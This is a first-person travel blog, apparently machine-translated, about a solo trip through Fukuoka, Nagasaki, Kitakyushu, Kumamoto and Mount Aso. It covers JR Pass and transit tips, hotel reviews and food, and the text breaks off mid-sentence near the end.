Tour 9/25 Shimabara Castle, Shimabara Three Shiba Inu (very far, consider) 9/26 10:00 Kumamoto Airport 12:30 Departure for return flight Go! Flight Tracker, iPhone Suica usage, Visit Japan pre-entry application‚Ä¶ these were mentioned in previous articles, so they won‚Äôt be repeated here.This time was also very impulsive: bought plane tickets and booked a hotel on 9/10, planned the itinerary on 9/15, and departed on 9/17!Day 1 DepartureThe 4:40 PM flight allows plenty of time to wake up and leave at a relaxed pace.After arriving at Taoyuan Airport MRT A1 Taipei Main Station, choose the same pre-check-in option to complete check-in and baggage drop-off at Taipei Main Station. At the airport, you can proceed directly to the departure gate without queuing at the counters ( For pre-check-in information, please refer to the official website ).This time, I also placed an AirTag in my checked luggage to track its location. It prevents losing the luggage and is very convenient while waiting at the carousel.Around 13:00, arrived at the airport and wandered around after clearing immigration.I casually ate an expensive but ordinary spicy chicken dish, then checked the luggage area; my luggage was also checked through to the airport.After eating, it was only about 14:30, so I casually bought a Japanese book to cram at the last minute.Encountered another plane on the wrong runway, causing the entire airport to reset; the plane circled around before takeoff, resulting in nearly a 30-minute delay; sat on an old plane with a very small screen.China Airlines partners with Wu Tong Hao to create the cutest dessert in the sky, featuring Dinotaeng, the adorable short-tailed kangaroo. The osmanthus oolong tea is also quite tasty.Due to a flight delay, I left the airport around 9:00 PM.After leaving the airport, you will see a sign indicating the direction to go and which bus stop to wait at. Besides Hakata, you can also reach other destinations. For reference, check this article or the official website. If you are heading to a distant place, be sure to check the bus schedule in advance.Originally planned to take Line 2 direct to Hakata Station, but it seemed the last train on Line 2 was still an hour away (I forgot), so I switched to Line 1 to Fukuoka Airport Domestic Terminal (Fukuoka Airport Subway Station), then took the subway to Hakata and transferred to the Nanakuma Line to Watanabe-dori Station.Hello Fukuoka!The left side of the second photo is the hotel where we will be staying.Hotel mini review: Overall, it feels a bit old, with dim lighting, average soundproofing, and the air conditioning makes some noise. However, it is still clean and tidy. I do regret not spending a bit more to stay at the nearby APA chain hotel.Originally planned to visit the street stalls on the first night, but was too tired and ended up grabbing a quick meal at a convenience store to rest early for tomorrow‚Äôs itinerary.Day 2 NagasakiView of Fukuoka city from outside the bed early in the morning.Hakata StationTaking the subway to Hakata is too indirect. It‚Äôs faster to walk to Watanabe-dori and take a bus to Hakata.After arriving in Hakata, first go to the manned counter to exchange your JR Pass (show your passport) and reserve a seat for the trip to Nagasaki. There are many foreigners exchanging JR Passes, and the wait was nearly an hour. It is recommended to go early or exchange it in advance. The JR Kyushu Pass still requires manual exchange at the counter. Please line up early to exchange it. If Hakata Station is too crowded, you can consider exchanging at nearby stations for a faster process! I bought a five-day pass, which starts from the day of exchange. You use the pass (with the date and amount) to enter and exit stations. The reserved seat ticket only shows your seat location and cannot be used to enter or exit stations. Keep the pass safe, as you‚Äôll need it for all five days. If lost, it‚Äôs gone!The trip from Hakata to Nagasaki has two segments. You first arrive at Takeo Onsen, then transfer to another train to Nagasaki. The transfer is on the same platform, and the train schedules are well coordinated. Basically, you just get off and walk across to the other side to board the next train.While waiting for the train, I noticed that trains in Kyushu all have unique characteristics!!The seat is spacious and comfortable, with a window view to enjoy the scenery.Estimated driving time: about 1 hour 50 minutesA Small Episode: Successfully Completing a National Diplomacy ‚úÖ Sitting next to me was a family: a dad and mom with two kids going out to play. Halfway through the ride, one child suddenly vomited. Seeing that the dad had no tissues and was using a newspaper to clean up, I handed him some tissues and wet wipes. When I was about to get off, my dad gave me a souvenir from Sanyuan City (shrimp rice crackers).Nagasaki StationAfter leaving Nagasaki Station, the weather was great! I was worried it might rain today.After exiting, take the tram towards Nagasaki.Nagasaki (South)The first stop is to head south to Nagasaki Shinchi Chinatown for a visit.It might be a unique attraction for foreigners, but it‚Äôs quite normal for Chinese visitors. Inside, they sell Nagasaki-style gua bao, nagasara udon, qiangbang noodles, xiaolongbao, and more. However, I wasn‚Äôt very hungry at the time, so I just walked around and left.Walking all the way to Glover Garden, we also passed by the Confucius Shrine XDAfter passing through the Dutch Slope (which is just a slope), take the escalator up to Glover Garden Entrance 2. The entire terrain is a large hillside facing the sea.A quick stroll through Glover Garden reveals architectural styles and interior decorations very similar to Tamsui Fort San Domingo, as both were built by the Dutch.Don‚Äôt forget to redeem your free photo; from here, you can also view the cruise ships at Nagasaki Port.On the way down the mountain, we passed by ≈åura Catholic Church. We didn‚Äôt go inside, just took a photo and left.I bought a Nagasaki-style gua bao to try, but I still think Taiwan‚Äôs version tastes better!On the way back north to the Nagasaki Atomic Bomb Museum, we stopped at Meganebashi Bridge to take photos. The reflection in the water from the front view is really beautiful. It‚Äôs worth a shot if you have time.Nagasaki (North)Visiting the Atomic Bomb Museum evokes a deep sense of immersion and reflection. The venue features many scenes (from the time of the explosion or immersive settings), installation art, historical materials, and interviews; allowing visitors to fully immerse themselves in the historical atmosphere and reflect on the horrors and cruelty of future wars.After leaving the museum, walk straight ahead to reach the atomic bomb explosion site, Peace Park.Colorful paper cranes are hung everywhere on the streets (including the Atomic Bomb Museum) as symbols of prayers for peace.Mount Inasa Night ViewAfter leaving Peace Park, stop by Komeda for a short break to prepare for the evening visit to Mount Inasa night view, one of the world‚Äôs top three night views.Check the bus schedule; it‚Äôs better to get off a stop earlier at the bus stop near the base of Mount Inasayama cable car (Fuchu Shrine Station), then stroll to the station to wait for the bus.The bus was delayed, which was frustrating. This small stop had no electronic display, and Google Maps showed the bus had left, but I didn‚Äôt see it. After waiting over 5 minutes, I thought maybe there were no buses today, so I quickly checked for other nearby stops with buses to Yuanshen Shrine. Then I walked another 10 minutes to a different stop and took another bus to get there. Funny thing is, halfway there I saw the delayed train arrive‚Ä¶ but it was already too late OrzAfter getting off, directly opposite is Fuchi Shrine. Walk straight up and pass through the kindergarten to reach the Nagasaki Cable Car (Fuchi Shrine Station). Since we didn‚Äôt plan to stay late, we bought a round-trip ticket (cheaper). However, if you stay too late, the cable car will stop running, and you‚Äôll have to take the bus back.A bit Wulai -&gt; Yun Hsien Resort Fu.After getting off the cable car, there is another scenic cable car you can take, but I didn‚Äôt try it and walked straight towards the observation deck.Forgot to take a photo of the observation deck. It is a 360-degree tower offering panoramic views of Nagasaki city, the port, and the mountains, and there is no admission fee. You can watch the sunset over the port in the west and then enjoy the city night view in the east.The observation deck is spacious, so you don‚Äôt have to worry about crowds.After sunset, you can see the entire Nagasaki city and station night view, which is very beautiful.One last look at Nagasaki Station‚Äôs night view, then buying Nagasaki Castella as a souvenir (later found out it‚Äôs also sold in Hakata, with a shelf life of about 12 days, so it would have been better to buy it later‚Ä¶), and getting ready to return to Hakata.Encountered a delay again, this time with JR (signal failure); the train was delayed almost an hour before arriving at Hakata (already exhausted). The driver drove fast, making the ride feel very shaky.Bought some late-night snacks and went back to the hotel to rest.Day 2 Yanagawa and Dazaifu Day Trip + LalaPort FukuokaIn the morning, go to the Fukuoka (Tenjin) Tourist Center to buy a one-day pass ( Available at Fukuoka Tenjin, Yakuin, or online ). You can calculate to see if it‚Äôs cheaper. KKday „ÄêKyushu Tickets„ÄëDazaifu Yanagawa Tour Package (Pick up at Taoyuan Airport)West Railway ‚Äî One-day tour of the two major attractions: ‚ÄúAncient Capital Dazaifu‚Äù and ‚ÄúWater Town Yanagawa.‚ÄùAdditionally, two coupon books will be given, one from Dazaifu includes a voucher for a free plum branch cake.The order is flexible, but the boat tour has a time limit and ends after 2 PM; so just follow the schedule: Fukuoka -&gt; Yanagawa -&gt; Dazaifu -&gt; Fukuoka.After buying the ticket, go to the manned window and show your ticket to the station staff. You can then enter the station and board the train directly (no seat reservation needed) to Yanagawa.Drive time: About 1 hour 10 minutesYanagawa Boat TourAfter exiting, you will see staff wearing white vests (if not, you can ask at the nearby service center). They will give you a map, return route, timetable, and directly guide you to the shuttle bus to the ferry terminal.Exiting also requires manual ticket inspection, and the station staff will tear the ticket from Fukuoka to Yanagawa Station.Originally, I thought I could walk based on the distance, but as soon as I exited the station, staff were there to guide me attentively, so I decided to take the bus.Waiting at the boarding area for the next boat, I happened to find a Taiwanese family traveling ahead of me. I joined them, and we chatted along the way (since I was traveling alone and don‚Äôt speak Japanese XD, I barely talked to anyone in Kyushu).The water is very clean. This season, the greenery is less vibrant, so it‚Äôs not as beautiful, but there are fewer people.The boatman will introduce the passing sights along the way and sing songs (most Taiwanese people have heard them, many are old classics).When crossing the bridge, the boatman asks everyone to lower their heads to avoid hitting anything, which is quite interesting; there is little shade along the way, so it can be a bit sunny.There is an ice shop along the way that sells fruit ice, perfect for cooling down; the boatman also gives each person an ice pack to help stay cool (very thoughtful).Chatting along the way with the dad from the Taiwanese family we grouped with earlier, I ended up getting a business card.After getting off the ship, I couldn‚Äôt find a seat on the free shuttle bus and mistakenly queued for another shuttle (not the West Rail ticket shuttle), so I was refused boarding; it‚Äôs better to study the pickup points on the map (Chuanliu Wharf (Okinobata)) or just ask directly for faster help.I later took the bus back to Nishitetsu Yanagawa Station.DazaifuTo go from Yanagawa to Dazaifu, you need to transfer at Nishitetsu Futsukaichi Station to a train bound for Dazaifu (you must change to a different platform).Travel time: about 1 hourTake the Traveler train to Dazaifu, passing through Gojo (2.5 stops, sigh QQ); it‚Äôs somewhat like the route from Beitou to Xinbeitou, with only one train running back and forth.There is a carriage section displaying Dazaifu artifacts and offering postcard writing. You can check it out.Dazaifu Station is also very beautiful, and the Lawson outside has a strong Japanese vibe.On the right side after exiting is the world‚Äôs only pentagon-shaped (Japanese certified) Ichiran Ramen bowl.After finishing ramen, try a plum branch cake. It‚Äôs not really related to plums, more like a red bean grilled mochi. It tastes best when freshly made, with a crispy outer layer. Delicious!I forgot to use the refund voucher that came with the West Rail pass and ended up buying one myself for 150 yen; since the validity is only one day, I can‚Äôt take it back to Taiwan.Continuing from Omotesando towards Dazaifu, you will pass one of Japan‚Äôs most beautiful Starbucks. The space is quite large but also crowded, so I left without stopping.The bridge leading to the shrine should be great for photos at night with few people around. If there are too many people, the shots will be random and messy.After the visit, return to Dazaifu Station and head back to Fukuoka Lalaport.Fukuoka LalaportTake the train from Dazaifu Station back to Futsukaichi, then transfer to a train heading towards Hakata. Get off at ≈åhashi (Fukuoka), exit the station, and turn left to the boarding area to find the direct Lalaport shuttle. Just one stop away is Fukuoka Lalaport.Total travel time: about 50 minutesRight upon arrival, you see the huge Gundam of Fukuoka outside.Lalaport is very large, great for shopping, and family-friendly; upstairs there is a big playground where kids play and some people lie down to rest.Upstairs, there is a Jump Shop selling merchandise related to Weekly Shonen Jump, including Haikyuu, One Piece, Hunter x Hunter, Jujutsu Kaisen, Chainsaw Man, and more. I bought some Jujutsu Kaisen items.Tax refund is available for purchases over 5,000 yen, but it seems the refund goes to their app or something similar, which is a bit complicated. Also, food items are not included.Went to the food court to eat Miyazaki beef bowl. On the way out, bought some late-night snacks to take back (curry bread, Jusui-an daifuku).The Gundam glowing at night is still quite impressive.For the return direct bus, do not board at the original drop-off point. Follow the signs inside the venue and board directly at the bus stop within the venue.Returned to the hotel to rest, using my own tablet (the TV is too old and not smart); the curry bread is crispy and delicious, with meat filling inside. The daifuku is also good, but I prefer Benzaiten.Day 3 Mojiko, Kokura Castle, Hakata Canal City, Nakasu YataiEarly in the morning, head to Hakata Station, take the JR train to Mojiko, then return to Kokura Castle.Hakata to Kokura TransportationA Minor IncidentWithout checking Google Map carefully, I took the Shinkansen Nozomi 20, which is not covered by the JR Pass. When exiting, the gate wouldn‚Äôt open, and after staff assistance, I had to pay an extra 2,160 yen to exit. But it was really fast‚Äîthis train reached Mojiko in just 15 minutes.Mojiko PortArrived at Mojiko safely (was worried about getting fined).Exit and walk forward to reach Mojiko, which is completely empty on weekdays; just in time to see the Blue Wing Mojiko Bridge lowering.After putting it down, you can walk back to the observation tower behind, overlooking the entire Mojiko.Just stepped out and took a walk around Mojiko.For lunch, we had the famous curry yaki from Mojiko.Kokura CastleMoji is very close to Kokura, but Kokura is a small station. Outside the station is quite barren, and I even took a big detour looking for the Kokura entrance. Actually, the entrance is right on the mall side outside Kokura.Kokura Castle is quite small, but there are many exhibits inside. However, the view from the main keep is rather ordinary (facing the front, you just see the mall).After the visit, I returned to the station to take the train back to Hakata. I took the JR as planned, but since it was a small station with only local trains, it took over an hour to get back slowly.Hakata Canal CitySince it was still early to return to Hakata, we went to Hakata Canal City and strolled around the city.Without checking specifically, I originally thought it was some kind of ‚Äúcastle‚Äù or ‚Äúmoat,‚Äù but it turned out to be a department store XD. There really is a ‚Äúmoat‚Äù with a water dance show.There are many places to explore here, including a Jump Shop.It was still early, so I wandered out to eat at Hakata Gion Iron Pot Fried Dumplings.The skin is crispy and the inside is juicy, very delicious; because of the language barrier, the auntie at the shop cutely used gestures, miming a big belly to indicate 2 portions (1 portion has only 8 pieces, 2 portions with 16 pieces are filling). At the time, I didn‚Äôt realize this, so I only ordered one portion plus Hakata‚Äôs famous mentaiko.Nakasu YataiAfter eating, before it got dark, I took a stroll along Nakasu Yatai.It was still early, so I went to shop at Tenjin‚Äôs department store (Parco) first and planned to return to see the night view after dark.Upstairs has Animate and you can get Gojo Satoru on your first gacha pull.The night view of Nakasu yatai gives a lively, bustling atmosphere.Flashy and eye-catching Japanese-style advertising signs.Nakasu Yatai is the roadside food stalls on this side, bustling with people; they offer ramen, oden, and grilled dishes. Nothing particularly caught my interest, so I didn‚Äôt go in to eat.Return to the hotel to drink, have a late-night snack, and rest.Day 4 Sumiyoshi Shrine, Kushida Shrine, Tenjin Underground Shopping Mall, Fukuoka Tower, Fukuoka SoftBank Hawks Baseball GameOne-day walking tour in Fukuoka: after leaving the hotel, first walk to the nearby Sumiyoshi Shrine.Sumiyoshi ShrineIt‚Äôs small, so I probably wouldn‚Äôt go out of my way unless it‚Äôs nearby.Passing through Hakata Canal City again to head to Kushida Shrine.I saw a food truck parked in the morning on the street. It was so small and cute.Kushida ShrineKushida Shrine is relatively large, and I also drew a fortune slip. For job hunting, it said ‚Äúsudden success,‚Äù which gave me new hope for work.There is a display of the Hakata Gion Festival portable shrine, which is very large and spectacular.Continue strolling in Fukuoka, and at noon, head to „Éè„Ç´„Çø„Éü„É§„ÉÅ„ÇØ (Japan‚Äôs No.1 Miyazaki Beef Specialty Store Hakata Miyachiku) to taste Miyazaki beef.This Miyazaki beef steak with beer costs around NT$650, tasty and affordable! The Miyazaki beef is juicy and has no off-flavors.Tianshen Underground StreetAfter lunch, we wandered around Tenjin area and Tenjin Underground Shopping Mall, buying souvenirs like chick-shaped cookies and cakes. We also went to a supermarket to try the popular Muscat seedless grapes.Wandering around Tenjin, I spotted a wild Kumamon director.First, return to the hotel to drop off the souvenirs you bought and rest for a while, then head to Fukuoka Tower and watch the baseball game.Fukuoka TowerTake a bus from the city center to Fukuoka Tower. KKday Japan - Kyushu | Fukuoka Tower Admission TicketFukuoka Tower features a full mirror design, which looks stunning from the outside. I think it‚Äôs even more beautiful than the Tokyo Skytree!(Thanks to the passerby lady for taking the photo)However, since the tower is located on the outer edge of the city by the sea, the view from the top is average; the night view is uncertain.After leaving Fukuoka Tower, slowly walk to the previous stop, which is Fukuoka PayPay Baseball Stadium, where you can feel the scent of the sea.Fukuoka SoftBank Hawks Baseball GameThere are many people (about 70% full), but tickets are still available on-site.Ticket Buying AnecdoteWhen buying tickets, I encountered an older man at the counter. I saw a foreigner nervous and trembling because of the language barrier; I got nervous too XD. In a moment of brain fog, I chose a reserved seat in the last row of the front stand, right in the middle (with people seated on both sides). It was super awkward entering and exiting since I had to say „Åô„Åø„Åæ„Åõ„Çì (excuse me) all the way through. The seat was also very small, squeezed among Japanese people. I didn‚Äôt speak a word of Japanese, which made it even more awkward‚Ä¶ I sat properly and seriously watched the entire game.The ticket price is nearly 1,500 TWD. I think I‚Äôll just buy the cheapest lousy seat and watch comfortably by myself.I have to say the dome‚Äôs visual effects (being very close to the field) and the large screen animations are excellent.The cheering tradition of the Fukuoka SoftBank Hawks involves inflating balloons by hand pumps during the top of the 7th inning and then releasing them. As for the trash‚Ä¶ no one worries about it at first, but eventually someone cleans it up.The home team won 4:2, more exciting than the CPBL. Pitchers consistently threw around 145 km/h. Every inning had offense and defense, with few quick three-up three-down innings. Yet, the pace of the game was fast and felt very smooth.However, when it comes to cheerleading, Taiwan still has a richer scene than Japan.Home team wins will have fireworks inside the Big Dome, very cool!!Bought a SoftBank Hawks towel as a souvenir to mark the visit, also resolving the embarrassment of last time when the Hanshin Tigers Koshien Stadium tickets were sold out and I couldn‚Äôt get in.There were many people leaving, but no one stood too close and everyone walked slowly. I followed the crowd all the way to the nearest subway station, Chinatown Station, because the bus line seemed very long.Resting at the hotel and trying the musk seedless grapes bought in the afternoon. They are very sweet, maybe a bit too sweet.Day 5 Kumamoto (Kumamoto Castle, Tsuruya Department Store)Checked out early in the morning and walked around the Yakuen area near the hotel.Nothing special found, just had McDonald‚Äôs (a McMuffin with egg and iced Americano for only $107), then came back to get the luggage and prepare to take the JR train to Kumamoto.Finally, said goodbye to this hotel. The lobby has Fukuoka SoftBank Hawks dolls, and outside there is a üáπüáº flag, which is quite impressive because next door is a Friendship Convenience Store run by Chinese people, with many Chinese customers.Fukuoka Hakata -&gt; KumamotoBooking a seat at the station‚Äôs electronic kiosk. Since it‚Äôs a bit far and I‚Äôm carrying luggage, I decided to reserve a seat.According to the manual for seat selection, in short: Choose language first, choose language first, choose language first (otherwise, you cannot change it after inserting the card; you must exit and start over) Insert JR Pass card Select departure and arrival stations (search by English station names) Select Schedule and Seat Completed There are station staff on site to ask if you have any questions. Originally, there was a train departing in 15 minutes with no seats available, so I could only buy a ticket for another train departing 45 minutes later.Luckily, I didn‚Äôt buy that train. It takes about 10 minutes to walk from Hakata Station to the Shinkansen platform heading to Kagoshima (via Kumamoto). The route is a bit roundabout and far, so it‚Äôs too tight on time.Used it up just before the last day of the JR Pass expiration. I was initially worried that my 27-inch suitcase (about 69 x 50 x 29 cm) might not fit on the overhead luggage rack, requiring me to buy a special large luggage seat, which is mandatory if the three dimensions exceed 160 cm. A 27-inch suitcase is too tight to place by the feet and may block the neighbor. Testing shows it fits stably on the luggage rack, but you still have to lift it up. Choosing a window seat risks blocking aisle passengers when placing or retrieving luggage. Fortunately, a kind Japanese gentleman offered his seat so I could handle my luggage.Upon arriving in Kumamoto, I immediately saw the giant Kumamon. First, I took the JR and subway to the hotel to drop off my luggage (Shiritsu Taiikukan-mae Station).Kumamoto is full of Kumamon everywhere‚Ä¶.2024‚Äì11‚Äì16 Update: ‚ö†Ô∏è‚ö†Ô∏èKumamoto Prefecture Public Transportation: Kyushu Sanko Bus, Sanko Bus, Kumamoto Bus, Kumamoto City Bus, and Kumamoto Electric Railway no longer accept Suica, PASMO, ICOCA, or other transit cards for fare payment. Currently, only cash is accepted. Credit card payment may be introduced in the future. Please take note. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏èKumamoto CastleAfter checking into the hotel, take the tram to Kumamoto Castle (get off at Tsuromachi-suji Station).You can first visit Sakura-no-Baba Josaien (forgot to take photos) to stroll and recharge. You can also buy Kumamoto Castle tickets here. There are few people around, unlike at the Kumamoto Castle entrance where groups can cause crowding.Tickets available: Kumamoto Castle 800, Kumamoto Castle + the building behind it (Historical and Cultural Experience Yuyuza) 850, Kumamoto Castle + the building behind it (Historical and Cultural Experience Yuyuza) + Kumamoto Museum 1,100.I bought the Kumamoto Castle + Yuyuza ticket, thinking it was only 50 yen more. After walking around, I found it just okay. It includes additional exhibitions inside Kumamoto Castle and earthquake-related artifacts, which are good for photo opportunities and experiences.Kumamoto Castle‚Äôs main keep was fully restored and reopened in 2023, while other buildings are still under repair (cranes can be seen).The new plan is to create a skywalk, following the route all the way to Kumamoto Castle.After reaching the castle tower, you can see the skywalk stretching along the path.Aerial view of the plaza in front of Kumamoto Castle and the historic site under ongoing repairs in the back.Earthquake aftermath scenario model.Next to the square, the souvenir shop has a Kumamoto Castle model, completing my collection of the three famous castles!Return the same way to the ticket area and visit Yuyuza; inside there is a model of Kumamoto Castle and a Lego version of Kumamoto Castle, which is very cool.Due to bad weather, we did not detour to the museum or Kato Shrine.Walk back to T≈çrimachi-suji Station, where you‚Äôll find Kamitori Shopping Street and Kumamoto‚Äôs local Tsuruya Department Store. The east wing‚Äôs first floor of the department store houses the recently renovated Kumamon Square (Kumamon Chief‚Äôs Office).While wandering around the shopping street, I happened to come across a Kumamon x Traffic Safety public event and received a Kumamon tote bag.This area is not very fun to explore and quite boring; only the Tsutaya Bookstore and the MUJI building are worth visiting. As soon as you get off at Kumamoto Station, you can feel there are many elderly people and few young people. The local Tsuruya Department Store mostly caters to the elderly, selling mainly women‚Äôs clothing and household items, with fewer products for young people.Went to the Kumamon merchandise store at Tsuruya Department Store to buy some Kumamon items (more styles than Kumamoto Plaza), then went to the department store‚Äôs underground shopping area to buy alcohol and food (dinner + late-night snacks) to eat back at the hotel.È¶ôÈú≤ is a local Kumamoto sake recommended by the shop. It is sweet and smooth to drink, but I feel it lacks a strong rice flavor.It is worth mentioning the hotel. In the past, I didn‚Äôt pay much attention to reviews; I just looked for ones with around 3 stars or higher. This hotel‚Äôs soundproofing was poor, and the entire floor was occupied by elementary school graduation trips. For two consecutive days, the doors kept slamming loudly morning and night, which was very disturbing.After checking the detailed reviews on Google/Agoda, I felt a strong sense of resonance.Poor soundproofing seems to be a common issue in old hotels, which I can tolerate (I bring earplugs); however, the hotel‚Äôs WiFi, as previous reviews mentioned, is just a sham.The WiFi signal covers the entire area, but even with full signal strength inside the room, the speed is very slow and web pages won‚Äôt load. You have to stay close to the door for the internet speed to be normal, which is almost like having no internet at the hotel. The price is also not attractive. It‚Äôs better to stay in Fukuoka; for the same price, you can directly book APA in Fukuoka. After this experience, I realized that even Japanese hotels require checking reviews‚Ä¶Really, aside from convenient transportation to the airport, there are no advantages. There are no convenience stores nearby (you have to walk more than 10 minutes to find one).Day 6 Suizenji Jojuen Garden, Kumamon Square Performance, Hanabata Plaza, Sakuramachi Shopping CenterIn the morning, I went out and walked straight to Suizenji Jojuen Garden across the street. KKday Sample Itinerary: Kyushu Kumamoto One-Day Tour | Aso Nakadake Volcano, Kusasenri, Kumamoto Castle, Suizenji Jojuen Garden / All-You-Can-Eat Seasonal Fruits | Departure from Fukuoka Hakata (Chinese, English, Japanese Supported)Suizenji Jojuen Garden (Izumi Shrine)It has a vibe similar to Banqiao Lin Family Garden. The place is very clean, the water is clear, and there is a small Mount Fuji, a Suijin Shrine, fat koi fish, and cats.Kumamon Square PerformanceAfter walking, take the tram to Suidomachi and head to Kumamon Square (visited yesterday).Inside, there are Kumamon-themed items for photos, and outside, a monitor shows the inside situation.Because it was still early before the 11 o‚Äôclock performance, we first went to the neighboring Tsuruya Department Store to find something to eat.You can check the performance schedule on the Kumamoto Square official website (times may vary, but there are usually three shows on Saturdays).Passing by the first floor of Tsuruya Department Store, I also spotted a department head sadly playing the piano as a part-time job.Went to B1 to try the locally famous Fengle Mantou, a thick-filled wheel cake. It comes with two fillings: white bean and red bean. Those who love sweets will really enjoy it. Paired with coffee, it makes a perfect breakfast.Return to Kumamon Square around 11 o‚Äôclock to wait for the performance. There is no need to draw lots now; just enter before the show starts. After the time passes, you can only watch from outside on the monitor. If you have children, you can sit inside.Before the performance, the rules will be explained, such as: no hitting Kumamon, no raising cameras above the head when taking photos (it blocks those behind), according to Japanese law faces must be pixelated, and everyone is welcome to upload to SNS.The performance lasts about 30 minutes. The host, a young lady, will speak on behalf of Kumamon (entirely in Japanese). The program roughly includes greeting everyone, sharing fun facts about Kumamoto, dancing (to the catchy song above), and saying hi to people from different countries. (This event has the most Taiwanese attendees XD).Kumamon is very cute, with big and entertaining movements.The merchandise sold inside the square is limited and relatively expensive, so I didn‚Äôt buy anything here.After watching the show and nearing noon, we walked down the shopping street to eat at Katsuretsu-tei Shinsaigai Main Store. Stepping outside the shopping street, the atmosphere instantly shifted from child-friendly to adult-only, with a whole row of free guide shops (the same on the other side at Kumamoto Ginza Street).Extra thick Juice pork cutlet rice, with a special side of their pickled vegetables (shared, self-served, remember to use the red chopsticks). Everything else is like eating Japanese pork cutlet in Taiwan, with a grinding stick and sesame seeds to make your sauce; rice, tea, soup, and cabbage are all free to refill. Ate two bowls of white rice in one go, very satisfying.Flower Field PlazaAfter eating and drinking enough, continue walking down the shopping street towards Hanabatake Plaza.It happened to be Saturday when there was an event at the square, Food Summit 2003, with food stalls all around. A stage was set up in the middle for a breakdancing performance.Bought a glass of sparkling wine and grilled sausage, sat down to watch the show. The sausage wasn‚Äôt flavorful and not as good as in Taiwan.Halfway through eating, I accidentally hit someone in the audience, which was a bit scary but very immersive; later, it got too hot, so after finishing, I left and went to the Sakura Town Shopping Center behind to browse the department store.Hanabatake Plaza seems to have events every weekend. You can check ahead before visiting. Next week is the Taiwan Festival!Sakuramachi Shopping CenterThere is a Kumamon waving on the rooftop, and the second floor also sells Kumamon merchandise (I think it‚Äôs the most complete collection).There will also be Kumamon performances here; please refer to the announcement for the schedule.You can climb the stairs from outside all the way to the rooftop to find the waving Kumamon mascot. This building also houses the Kumamoto Bus Center on the ground floor, where you can buy tickets on the second floor to travel to other cities.There is a large garden on the rooftop and a pool where kids can play with water.You can also take the escalator from inside. From the third floor‚Äôs Shusyuuen (this Shusyuuen is completely empty), you can find the escalator leading upstairs. I personally think Sakuramachi Shopping Center is newer and more enjoyable to shop at than Tsuruya Department Store.Next to the Sakura Town Shopping Center is the Kumamoto Prefecture Product Hall. Besides Kumamoto‚Äôs local specialties, it also offers some Kumamon merchandise (e.g., Kumamon incense burner XD).On the way back, I walked through the upper and lower shopping streets again.Went to Muji to buy clothes and miscellaneous items, and restocked toiletries at Matsumoto Kiyoshi (for some reason, my Visa card never works at Matsumoto Kiyoshi; it failed in Tokyo before, and again in Kumamoto this time, so I had to use cash in yen).Arrived at the hotel near evening. Had a quick dinner from Lawson on the way and went to bed early to prepare for tomorrow‚Äôs trip to Mount Aso!Day 7 Aso Volcano, Kusasenri, Aso Shrine, Kumamoto Station AMU PLAZA KUMAMOTO KKday Sample Itinerary: [Private Tour, Daily Departure] One-Day Tour in Kumamoto, Japan | Kumamoto Castle &amp; Mount Aso Crater &amp; Kusasenri (Includes Healthy Buffet All You Can Eat) | Departure from FukuokaEarly in the morning, I went to the bus stop to take the bus to Aso Station; while waiting, I encountered Kumamon again.I will first pass through Aso Airport (the day after tomorrow, Orz).A unique experience along the way is when entering the Aso volcano area. The vehicle introduces the Aso volcano and plays local mountain songs, inviting you to imagine strolling through the Aso volcanic grasslands.Arriving at Aso Station, there is a One Piece Usopp statue outside the station where you can take photos (I forgot).You can buy the Aso Volcano One-Day Pass here from the vending machine (it‚Äôs about a few hundred yen cheaper) and get the timetable. The one-day pass is only valid for boarding and alighting at the three stations listed on the timetable, and you must take a boarding ticket when boarding; it seems you cannot use it at other stations.I will take bus route 8, departing uphill at 10:45.Drive time up the mountain: about 40 minutes.There weren‚Äôt many people, and as the time approached, we lined up briefly and boarded. Everyone seemed to get on; however, likely due to mountain road safety, there were no standing spots. Also, those prone to motion sickness should take medication.Aso also offers a helicopter tour, allowing you to see the volcano from the air. Interested people can look into it.Aso VolcanoKami-komezukaOn the way up the mountain, you will first pass through Kusasenri before reaching the mountain summit station. From the summit station, transfer to another bus for about 10 minutes to reach the mountain crater.I happened to meet a TSMC colleague next door who was also traveling alone (on a business trip XD), and it was both of our first times in Aso, so we teamed up to explore together.At the mountain terminal, we had to change buses again. We were too lazy to wait in line, so we chose to walk up the mountain instead (about 15‚Äì20 minutes).Walk to the mountain square, and you will come out at the fourth crater of Aso Nakadake.Having a travel companion means taking photos is no longer a problem!The mountain is very cool and not hot at all, filled with a sulfur smell. If you have the condition shown in Image 3, consider your physical health.Just a quick glance, I didn‚Äôt reach the Aso Nakadake volcanic crater. I came up to take a look and then went back down the mountain.A Little AnecdoteWe were having such a great conversation along the way that we didn‚Äôt pay attention to the bus direction. When the bus was about to leave, we quickly got on, only to be taken back up again. So, we had to walk the route once more XDAfter arriving at the mountain terminal, clearly look for bus route number 8, bus route number 8, bus route number 8, heading downhill to Aso Station; get off at Kusasenri.KusasenriEat the famous Oka Gyudon. There are many people, but also many seats. The food is served quickly, almost no waiting time.After eating, go outside to stroll around Kusasenri (it has a vibe similar to Qingtian Gang). There is a horseback riding experience available.After eating, take the same No. 8 bus to Aso Station, then descend the mountain via the same route.Aso ShrineWhen I arrived at Aso Station, the JR train to Aso Shrine (Miyaji Station) was leaving in three minutes. If I missed it, I would have to wait another hour. I ran into the station and then faced the issue that Aso is a small station without electronic payment. I hurriedly bought a ticket from the vending machine and boarded the train. Aso Station has only one platform, so you can board without hesitation. Later, I found out that if you really don‚Äôt have time to buy a ticket, you can board first and pay when you get off.From Miyaji Station, it takes about 20 more minutes on foot to reach Aso Shrine (just walk straight, but it‚Äôs a bit far).Encountered a wild Kumamon on the road again.The shrine is small and can be visited quickly; part of the shrine is also under maintenance.Outside, there is a small Omotesando shopping street nearby where you can buy some food and take a short break. Thanks, big brother, for treating me to fried beef potato pancakes.After finishing the tour, we started walking back slowly. We originally planned to take the 15:47 JR train back to Kumamoto, but when we reached Miyaji Station, we found out that the train was all reserved seating, no free seats were sold, and it was fully booked, so we couldn‚Äôt board.Attach the timetable or check the schedule in advance; otherwise, like us, you‚Äôll have to wait an hour for the next local JR train to Kumamoto at 16:35.There was still plenty of time, so we walked back together and browsed Matsumoto Kiyoshi on the way. (Actually, it‚Äôs quite far, about a 10-minute walk).One last look at the peaceful Aso.The local train slowly headed back to Kumamoto, taking about 1 hour and 45 minutes to arrive.The route includes a zigzag section where the vehicle will reverse. Don‚Äôt worry, you are on the right ride!Kumamoto Station AMU PLAZA KUMAMOTOBack at Kumamoto Station, saying goodbye to my big brother, hoping to meet again someday.Shopping at the newly 